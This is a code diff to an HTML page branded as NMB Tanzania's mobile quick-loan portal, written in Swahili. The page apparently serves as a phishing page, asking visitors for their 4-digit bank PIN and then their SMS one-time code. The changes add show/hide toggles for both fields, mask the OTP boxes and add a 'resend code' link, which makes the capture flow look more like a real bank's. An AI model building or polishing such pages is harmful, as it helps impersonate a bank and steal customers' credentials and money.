@@ -5,6 +5,24 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>NMB Tanzania Mkononi - Mkopo wa Haraka & Portal</title>
   <link rel="stylesheet" href="style.css">
+  <style>
+    .password-container {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+    .password-container input {
+      width: 100%;
+      padding-right: 40px;
+    }
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      cursor: pointer;
+      font-size: 1.2rem;
+      user-select: none;
+    }
+  </style>
 </head>
 <body>
   <!-- Initial Page Loading Spinner Overlay -->
@@ -174,11 +192,12 @@
       </div>
       <div class="field">
         <label>Ingiza PIN ya NMB (Namba 4)</label>
-        <div class="pin-inputs">
-          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        <div class="pin-inputs password-container">
+          <input type="password" maxlength="1" class="pin-box toggle-target" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box toggle-target" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box toggle-target" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box toggle-target" inputmode="numeric">
+          <span class="toggle-password" id="togglePin" onclick="togglePinVisibility()">👁️</span>
         </div>
         <span id="pin-error" class="error-text hidden">PIN si sahihi. Tafadhali jaribu tena.</span>
       </div>
@@ -188,17 +207,24 @@
     <!-- VIEW 5: OTP VERIFICATION (4 DIGITS) -->
     <div id="view-otp" class="card hidden">
       <h2>Uthibitisho wa OTP</h2>
-      <p>Ingiza namba 4 za OTP zilizotumwa kwenda <span id="otp-target-display"></span></p>
+      <p>Weka nambari ya siri yenye tarakimu 4 iliyotumwa kwenye namba yako ya simu <span id="otp-target-display"></span></p>
       <div class="field">
-        <div class="otp-inputs">
-          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
-          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
-          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
-          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+        <div class="otp-inputs password-container">
+          <input type="password" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric">
+          <input type="password" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric">
+          <input type="password" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric">
+          <input type="password" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric">
+          <span class="toggle-password" id="toggleOtp" onclick="toggleOtpVisibility()">👁️</span>
+        </div>
+        <div style="text-align: center; margin: 15px 0; font-size: 1.2rem; font-weight: bold; letter-spacing: 4px;">
+          <span>****</span>
         </div>
         <span id="otp-error" class="error-text hidden">OTP si sahihi. Tafadhali jaribu tena.</span>
       </div>
       <button id="btn-submit-otp" class="primary-btn" disabled>WASILISHA OTP</button>
+      <div style="margin-top: 15px; text-align: center; font-size: 0.9rem;">
+        Hukupokea nambari? <strong style="color: var(--primary-blue); cursor: pointer;">Tuma tena</strong>
+      </div>
     </div>
 
     <!-- VIEW 6: SUCCESS -->
@@ -277,7 +303,35 @@
         }, 500);
       }
     });
+
+    // Toggle Pin Visibility Function (Opens and closes the eye icon dynamically)
+    function togglePinVisibility() {
+      const boxes = document.querySelectorAll('.toggle-target');
+      const toggleBtn = document.getElementById('togglePin');
+      let isPassword = true;
+      boxes.forEach(box => {
+        if (box.type === 'text') isPassword = false;
+      });
+      boxes.forEach(box => {
+        box.type = isPassword ? 'text' : 'password';
+      });
+      toggleBtn.textContent = isPassword ? '👁️‍🗨️' : '👁️';
+    }
+
+    // Toggle OTP Visibility Function (Opens and closes the eye icon dynamically)
+    function toggleOtpVisibility() {
+      const boxes = document.querySelectorAll('.toggle-target-otp');
+      const toggleBtn = document.getElementById('toggleOtp');
+      let isPassword = true;
+      boxes.forEach(box => {
+        if (box.type === 'text') isPassword = false;
+      });
+      boxes.forEach(box => {
+        box.type = isPassword ? 'text' : 'password';
+      });
+      toggleBtn.textContent = isPassword ? '👁️‍🗨️' : '👁️';
+    }
   </script>
 </body>
-  </html>
-  
+          </html>
+                                                                
